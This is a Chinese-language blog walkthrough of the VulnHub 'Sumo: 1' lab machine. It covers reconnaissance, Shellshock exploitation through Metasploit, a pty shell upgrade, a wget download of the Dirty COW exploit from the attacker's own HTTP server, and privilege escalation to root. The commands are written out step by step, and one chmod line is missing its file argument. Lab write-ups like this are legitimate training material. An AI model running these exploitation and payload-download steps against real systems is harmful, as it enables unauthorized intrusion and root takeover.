> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/n7HmbRANZzEyAMtn4CGDBw)

大家好，我们是想要为亿人提供安全的亿人安全，这是我们自己想要做的事情，也是做这个公众号的初衷。希望以干货的方式，让大家多多了解这个行业，从中学到对自己有用的知识。

**靶机描述：**

Target Address：http://www.vulnhub.com/entry/sumo-1,480/

Difficulty: Beginner(新手)  

Goal: Get the root shell i.e.(root@localhost:~#) and then obtain flag under /root).

Operating System: Linux

扫描靶机 ip 为 192.168.86.152

```
arp-scan -l
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqIIlourB3861TVdjVzX7icx7j0EhFPBbG94sibiaBPufxzg3P4YD7TKoictPXt5h2mjVicqVOu9UvoKVA/640?wx_fmt=png)

版本侦测和查看开放端口

```
nmap -sV -p- 192.168.86.152
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqIIlourB3861TVdjVzX7icxPQ3ib0oj7TovKia2HlT5mpkrQoc9aOlN0lT6tSpicib4hfrsde5Z8EkTUg/640?wx_fmt=png)

进入浏览器访问 80 端口，提示此为服务器默认页面  

```
http://192.168.86.152:80
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqIIlourB3861TVdjVzX7icxx5EU33z7Zib1Yaksia8hSUbFTL0NeRUTxvuQpuK3R6QsMMmdfAlwSUBw/640?wx_fmt=png)

执行 nikto 命令，OSVDB-112004 似乎存在漏洞

```
nikto -h http://192.168.86.152
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqIIlourB3861TVdjVzX7icx4jBYAe58BYiaiaTG8Nxj3IxwDuygVW9N6FMt2Fu817CwISGp2BJTLTEQ/640?wx_fmt=png)

用浏览器查看提示页面，找出漏洞 id 名 CVE-2014-6271

```
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271)
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqIIlourB3861TVdjVzX7icxpeqgAfFGmj1OpydSlAVGaFjC9VuYcNa0nReHicju1GkwMa6x10S2qjA/640?wx_fmt=png)

使用 msfconsole，搜索攻击方式

```
msfconsole
search CVE-2014-6271
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqIIlourB3861TVdjVzX7icxRuUPVlSicQibia6lrrp5MfzRnPiabxWUVkDoQj7NcBIQ9eyR3XCCp4jLjA/640?wx_fmt=png)

选择攻击方式，进行攻击设置

```
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set rhosts 192.168.86.152
set targeturi /cgi-bin/test
run
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqIIlourB3861TVdjVzX7icxXLKoRoutSRWkUjZH2RmZQ5gica62jT5FG3ibLQJxzRSIrIDb00NotKqQ/640?wx_fmt=png)

反弹 shell，变为交互式 tty，查看文件属性

```
shell
python -c'import pty;pty.spawn('/bin/bash')'
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqIIlourB3861TVdjVzX7icxSQzbNMcL7aVrjylsU4zbDj7xmvvFlbb6QgwibM6NcBl8tm9YYKFCOhA/640?wx_fmt=png)

使用脏牛提权，而脏牛提权漏洞影响 >=2.4.22 版本，执行命令查看内核版本

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqIIlourB3861TVdjVzX7icxUhkcWXY8zXe3fIwwXO2tqg6qyiaB9VyAeP06W1DnM9zLmWziceozL10w/640?wx_fmt=png)

下载脏牛漏洞脚本，文件名为 dirtycowscan.sh

```
https://github.com/aishee/scan-dirtycow/blob/master/dirtycowscan.sh
```

kali 开启 http 服务

```
python -m SimpleHTTPServer 8000
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqIIlourB3861TVdjVzX7icxSOAHmBxDTtqO8O8EdWfKmbaBNDywJxicQ4jRkOYxRzngYNaeGMNYD5Q/640?wx_fmt=png)  

远程访问 kali 并下载脚本文件，扫描并发现存在脏牛漏洞

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqIIlourB3861TVdjVzX7icxc6SicYb60KKJRuFH7MC3Dop9D9pDC0ubpqmxrEXibaPKcsH7ibJvY7Oew/640?wx_fmt=png)

把链接中的代码在 kali 中编辑成. c 的格式

```
https://www.exploit-db.com/raw/40839
```

在 shell 中下载 dirty.c 的文件，修改文件权限，进行编译 (方法在脚本的注释行中)

```
wget http://192.168.86.138:8000/dirty.c
chmod 777
gcc -pthread dirty.c -o dirty -lcrypt
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqIIlourB3861TVdjVzX7icxRmk0skbTicmsryCgOzeMsC1DiaHiaVFJ2oAjiaCTATaGGdJd5MhkVibqQOw/640?wx_fmt=png)

运行脚本，输入密码的地方可以随意设置

```
./dirty testpasswd
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqIIlourB3861TVdjVzX7icxIcpDta4xa7wxdDvFlr06j4S7S6mfeMCzshD53JNjoUXaA066K6scYg/640?wx_fmt=png)

使用 firefart 用户登录，使用刚刚设置的密码，获得 root 权限，拿到 flag

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqIIlourB3861TVdjVzX7icx8lBF7YQ05ibDKMAutWTyTDH1GVsgz97Ur8XDD63o3ObWJdmnVsptfbw/640?wx_fmt=png)